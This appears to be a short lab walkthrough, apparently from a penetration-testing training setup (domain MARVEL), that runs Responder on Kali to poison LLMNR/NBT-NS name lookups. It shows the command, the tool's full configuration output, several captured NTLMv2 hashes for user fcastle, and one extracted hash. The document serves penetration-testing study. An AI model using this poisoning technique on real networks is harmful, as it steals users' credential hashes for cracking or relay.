# Capturing Hashes with Responder
> 01.08.2024

--- 

**Getting Hashes with responder:**
```bash
┌──(mrmidnight㉿kali)-[~]
└─$ sudo responder -I eth0 -dwv 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.19.131]
    Responder IPv6             [fe80::20c:29ff:fe00:b31b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-VMVNQ6S306J]
    Responder Domain Name      [GU6J.LOCAL]
    Responder DCE-RPC Port     [48918]

[+] Listening for events...                                                                                                                         

[*] [DHCP] Found DHCP server IP: 192.168.19.254, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 192.168.19.129 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.19.129 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 192.168.19.129
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:87c6671cca544d9f:CBBFA1353DC46DF44CF3FD145FA3A50E:      
[SMB] NTLMv2-SSP Client   : 192.168.19.129
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:a85d3509554eefe5:35C2788B56DF319459B7AEB56583C8F4:      
[SMB] NTLMv2-SSP Client   : 192.168.19.129
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:04312f82f72127a6:B4F8B25F60830DB8A0947D7D01948EEA:      
[SMB] NTLMv2-SSP Client   : 192.168.19.129
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:21cc3b2f6965a52d:91ADFC1DBF88820C1FFA929F821B8FD6:
```

**Retrieved hash:**
```
fcastle::MARVEL:87c6671cca544d9f:CBBFA1353DC46DF44CF3FD145FA3A50E:
```
